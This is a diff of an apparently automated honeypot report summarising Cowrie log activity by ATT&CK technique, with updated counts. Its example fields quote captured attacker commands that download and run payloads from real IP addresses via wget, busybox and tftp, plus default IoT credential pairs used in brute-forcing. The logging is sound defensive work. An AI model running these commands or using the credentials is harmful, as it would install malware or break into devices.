@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-19 12:03:46",
+  "generated": "2026-08-19 13:04:12",
   "totals": {
-    "commands": 4685,
-    "login_failed": 2753,
-    "login_success": 1507,
-    "sessions": 2976
+    "commands": 4730,
+    "login_failed": 3030,
+    "login_success": 1511,
+    "sessions": 3251
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2753,
+      "count": 3030,
       "examples": [
         "root / vizxv",
         "root / 19801021",
@@ -21,14 +21,14 @@
         "root / 19820308"
       ],
       "first": "2026-08-19T00:00:00.138204Z",
-      "last": "2026-08-19T12:03:42.132292Z",
-      "unique_ips": 57
+      "last": "2026-08-19T13:04:10.597983Z",
+      "unique_ips": 62
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1507,
+      "count": 1511,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "hikvision / hikvision",
@@ -37,14 +37,14 @@
         "telnetadmin / telnetadmin"
       ],
       "first": "2026-08-19T00:00:00.538972Z",
-      "last": "2026-08-19T12:00:58.316143Z",
-      "unique_ips": 38
+      "last": "2026-08-19T12:56:10.532676Z",
+      "unique_ips": 42
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 88,
+      "count": 114,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-19T00:55:54.512846Z",
-      "last": "2026-08-19T11:26:47.982072Z",
-      "unique_ips": 9
+      "last": "2026-08-19T12:56:54.430352Z",
+      "unique_ips": 11
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 69,
+      "count": 85,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,8 +69,8 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T11:02:52.009866Z",
-      "unique_ips": 10
+      "last": "2026-08-19T12:56:54.430352Z",
+      "unique_ips": 12
     },
     {
       "id": "T1082",
@@ -91,14 +91,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T11:26:47.982072Z",
-      "unique_ips": 5
+      "last": "2026-08-19T12:56:17.671427Z",
+      "unique_ips": 6
     },
     {
       "id": "T1057",
@@ -180,19 +180,19 @@
   "unmapped": [
     [
       "shell",
-      1480
+      1481
     ],
     [
       "sh",
-      1480
+      1481
     ],
     [
       "system",
-      1463
+      1464
     ],
     [
       "/bin/busybox",
-      29
+      36
     ],
     [
       "/bin/busybox LZRD",
@@ -204,26 +204,34 @@
     ],
     [
       "enable",
-      11
+      12
     ],
     [
       "cd /proc && cat self/cmdline",
-      11
+      12
     ],
     [
       "linuxshell",
-      10
+      11
     ],
     [
       "ping ;sh",
-      9
+      10
     ],
     [
       "enablelinuxshell",
-      8
+      9
     ],
     [
       "busybox",
+      4
+    ],
+    [
+      "RPMA",
+      3
+    ],
+    [
+      "AMOO",
       3
     ],
     [
@@ -236,14 +244,6 @@
     ],
     [
       "echo Hi | cat -n",
-      2
-    ],
-    [
-      "RPMA",
-      2
-    ],
-    [
-      "AMOO",
       2
     ],
     [
